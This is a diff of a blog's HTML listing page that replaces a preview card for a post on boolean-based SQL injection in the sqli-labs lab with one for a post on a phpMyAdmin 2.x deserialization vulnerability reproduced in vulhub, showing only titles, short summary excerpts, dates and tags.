-                        <img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(4).png" class="responsive-img" alt="（四）SQL注入—布尔注入">
+                        <img src="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" class="responsive-img" alt="phpmyadmin反序列化">
                         
-                        <span class="card-title">（四）SQL注入—布尔注入</span>
+                        <span class="card-title">phpmyadmin反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-有时候页面一个显示位都不给，这样就无法通过联合注入查询信息了，只能通过页面返回信息的真假条件判断是否存在注入，就像这样
+                            0x01 漏洞说明phpmyadmin 2.x版本的setup.php中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。
+
+
+0x02 漏洞复现通过vulhub快速在docker中复现漏洞
 
 
 
-本篇用的靶场是sql-labs的第六关布尔注入
-先看看数据库的结构
-
-
-
-表emails的数据
-
-
-
-遇到页面无
+0x03 漏洞利用使
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-24
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
-                                    SQL注入
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
+                                    反序列化
                                 </a>
                             
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/php/">
+                        <span class="chip bg-color">php</span>
+                    </a>
+                    
                 </div>
                 
             </div>
